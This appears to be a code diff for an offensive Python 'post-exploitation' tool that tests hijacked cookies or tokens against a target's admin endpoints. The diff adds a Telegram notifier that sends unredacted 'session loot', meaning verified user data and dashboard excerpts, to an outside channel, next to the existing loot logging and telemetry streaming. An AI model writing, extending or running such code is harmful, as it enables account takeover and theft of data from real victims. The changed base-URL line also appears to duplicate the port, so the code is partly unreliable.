@@ -1,27 +1,40 @@
 #!/usr/bin/env python3
 """
-LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v7.5
+LIVE_LOGIN_VERIFIER.PY — Post-Exploitation Session & Privilege Verification v8.0 (With Telegram Telemetry)
 Senior Red Team Edition: Structural JSON schema validation, strict negative DOM assertions,
-and centralized framework loot exfiltration.
+centralized framework loot exfiltration, and real-time Telegram broadcasting.
 """
 import sys
 import os
 import time
 import json
 import httpx
+import asyncio
 from urllib.parse import urlsplit
 
-# Import centralized framework loot logger and telemetry
+# Import centralized framework loot logger, telemetry, and Telegram notifier
 from modules.loot_logger import save_session_loot
 from modules.telemetry import stream_proof
+from modules.telegram_notifier import send_telegram_alert
 
 def log(msg, color="\033[92m"):
     sys.stdout.write(f"{color}{msg}\033[0m\n")
     sys.stdout.flush()
 
+def broadcast_tg_alert_sync(loot_type, details):
+    """Helper to non-blockingly fire Telegram alerts from synchronous verifier functions."""
+    try:
+        loop = asyncio.get_running_loop()
+        loop.create_task(send_telegram_alert(loot_type, details))
+    except RuntimeError:
+        try:
+            asyncio.run(send_telegram_alert(loot_type, details))
+        except Exception:
+            pass
+
 def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=None, token=None):
     parsed = urlsplit(target_url if "://" in target_url else f"https://{target_url}")
-    base_url = f"{parsed.scheme}://{parsed.hostname}"
+    base_url = f"{parsed.scheme}://{parsed.netloc}"
     if parsed.port:
         base_url += f":{parsed.port}"
     
@@ -75,6 +88,15 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                         if status in [200, 201] and has_user_keys and not is_error_payload:
                             log(f"[!!!] SUCCESS! Verified API Session Loot at {ep} [HTTP {status}] [!!!]", "\033[91m")
                             
+                            loot_payload = {
+                                "endpoint": target_endpoint,
+                                "status": status,
+                                "verified_data": data
+                            }
+
+                            # BROADCAST UNREDACTED SESSION LOOT STRAIGHT TO TELEGRAM
+                            broadcast_tg_alert_sync("Live Login Verified API Session Loot", loot_payload)
+
                             # Stream telemetry and persist through centralized loot logger
                             stream_proof("LIVE_LOGIN_VERIFIED_API", ep, {"cookie_jar": cookies}, body, data)
                             save_session_loot(
@@ -84,7 +106,7 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                                 status=status,
                                 headers=dict(response.headers),
                                 body=body,
-                                extra_loot={"verified_data": data}
+                                extra_loot=loot_payload
                             )
                             return True
                     except json.JSONDecodeError:
@@ -107,6 +129,15 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                 if status == 200 and not is_spa_shell and has_real_dashboard_markers:
                     log(f"[!!!] SUCCESS! Verified HTML Dashboard Access at {ep} [HTTP {status}] [!!!]", "\033[91m")
                     
+                    loot_payload = {
+                        "endpoint": target_endpoint,
+                        "status": status,
+                        "response_excerpt": body[:300]
+                    }
+
+                    # BROADCAST UNREDACTED DASHBOARD LOOT STRAIGHT TO TELEGRAM
+                    broadcast_tg_alert_sync("Live Login Verified HTML Dashboard Access", loot_payload)
+
                     # Stream telemetry and persist through centralized loot logger
                     stream_proof("LIVE_LOGIN_VERIFIED_HTML", ep, {"cookie_jar": cookies}, body[:300], {"status": status})
                     save_session_loot(
@@ -116,7 +147,7 @@ def execute_live_login_verification(target_url, endpoint="/admin", cookie_dict=N
                         status=status,
                         headers=dict(response.headers),
                         body=body,
-                        extra_loot={"dashboard_markers_matched": True}
+                        extra_loot=loot_payload
                     )
                     return True
                 else:
